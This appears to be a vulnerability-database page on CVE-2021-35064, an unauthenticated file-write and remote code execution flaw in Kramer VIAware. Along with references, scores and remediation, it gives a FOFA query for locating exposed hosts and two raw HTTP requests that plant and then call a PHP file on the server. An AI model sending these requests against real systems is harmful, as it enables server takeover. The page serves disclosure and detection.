---
layout: post
cve_id: CVE-2021-35064
title: Kramer VIAware - Privilege Escalation and Remote Code Execution
pcap: true
pcap_path: /pcaps/2021/CVE-2021-35064.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-35064.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: critical
impact: 'Unauthenticated attackers can execute arbitrary PHP code via file upload,
  leading to complete server compromise and control over the Kramer VIAware system.

  '
remediation: 'Apply the latest firmware update provided by Kramer to fix misconfigured
  sudoers permissions and ensure proper validation in the web interface.

  '
reference:
- http://packetstormsecurity.com/files/166623/Kramer-VIAware-Remote-Code-Execution.html
- https://www.kramerav.com/us/product/viaware
- https://www.exploit-db.com/exploits/50856
- https://write-up.github.io/kramerav/
- https://nvd.nist.gov/vuln/detail/CVE-2021-35064
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2021-35064
  cwe-id: CWE-269
  epss-score: 0.82326
  epss-percentile: 0.99187
  cpe: cpe:2.3:a:kramerav:viaware:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: kramerav
  product: viaware
  fofa-query: icon_hash="1521468900"
tags:
- cve2021
- cve
- viaware
- kramer
- edb
- rce
- intrusive
- kramerav
- vkev
- vuln
---

## üîç Vulnerability Description
Kramer VIAware, all tested versions, allow privilege escalation and remote code execution due to misconfigured sudo permissions. Attackers can execute arbitrary system commands remotely if the web interface is accessible, due to vulnerabilities in the handling of privileged operations through ajaxPages/writeBrowseFilePathAjax.php and improper sudoers configurations.


## üåê HTTP Request
```nohighlight
POST /ajaxPages/writeBrowseFilePathAjax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Connection: close
Content-Length: 138
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
radioBtnVal=%3C%3Fphp+echo+md5%28%22CVE-2021-35064%22%29%3B+%3F%3E&associateFileName=%2Fvar%2Fwww%2Fhtml%2F38FLXMjMH22TZTlLdxt48mRpT6u.php
```

```nohighlight
GET /38FLXMjMH22TZTlLdxt48mRpT6u.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.19
Connection: close
Accept-Encoding: gzip
```

